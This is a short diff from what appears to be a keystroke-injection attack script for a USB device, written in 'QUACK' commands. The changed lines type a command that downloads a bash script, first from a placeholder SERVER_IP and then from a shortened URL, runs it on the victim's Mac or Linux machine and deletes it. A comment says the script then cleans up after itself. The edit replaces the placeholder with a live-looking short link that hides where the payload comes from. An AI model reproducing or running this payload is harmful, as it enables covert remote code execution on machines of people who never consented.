@@ -41,8 +41,8 @@ QUACK BACKSPACE
 QUACK BACKSPACE
 
 # Downloading bash script from server and Executing bash script which is same for mac and linux
-QUACK SRTING curl http://SERVER_IP/payload.sh -o payload.sh && bash payload.sh && rm payload.sh
-QUACK DELAY 200
+QUACK SRTING curl -L https://shorturl.at/tHIW7 -o payload.sh && bash payload.sh && rm payload.sh
+QUACK DELAY 1000
 QUACK ENTER
 
 # The cleanup process will done by bash script
